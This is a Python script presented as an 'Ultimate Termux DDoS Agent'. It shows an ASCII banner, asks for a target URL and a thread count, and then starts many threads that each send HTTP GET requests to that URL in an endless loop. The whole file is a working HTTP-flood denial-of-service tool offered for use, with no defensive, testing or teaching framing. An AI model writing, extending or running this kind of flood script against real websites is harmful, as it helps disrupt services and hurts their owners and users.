import socket
import threading
import time
import random
import requests
import os

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print("Request sent!")
        except requests.exceptions.ConnectionError:
            print("[!!!] " + "Connection error")

threads = 20

os.system('clear')

print("\033[91m" + r"""
 ██████╗  ██████╗ ████████╗      ██████╗  ██████╗  ██████╗ ███████╗
 ██╔══██╗ ██╔══██╗╚══██╔══╝█████╗██╔══██╗ ██╔══██╗██╔═══██╗██╔════╝
 ██║  ██║ ██████╔╝   ██║   ╚════╝██║  ██║ ██║  ██║██║   ██║███████╗
 ██║  ██║ ██╔═══╝    ██║         ██║  ██║ ██║  ██║██║   ██║╚════██║
 ██████╔╝ ██║        ██║         ██████╔╝ ██████╔╝╚██████╔╝███████║
 ╚═════╝  ╚═╝        ╚═╝         ╚═════╝  ╚═════╝  ╚══════╝ ╚══════╝
""" + "\033[0m")
print("\033[92m                 [+] Created by Dhanush [+]\033[0m")
print("\033[96m               [ Ultimate Termux DDoS Agent ]\033[0m\n")

url = input("Enter URL>> ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain!")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " threads started!")